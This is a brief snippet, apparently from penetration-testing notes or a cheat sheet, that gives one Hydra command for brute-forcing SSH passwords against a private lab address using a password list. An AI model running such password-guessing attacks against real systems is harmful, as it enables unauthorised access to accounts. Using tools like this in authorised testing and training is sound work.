- `hydra example (ssh)` 

```
hydra -l user -P passwords.txt ssh://10.10.10.123 -t 4 -o hydra_out.txt
```

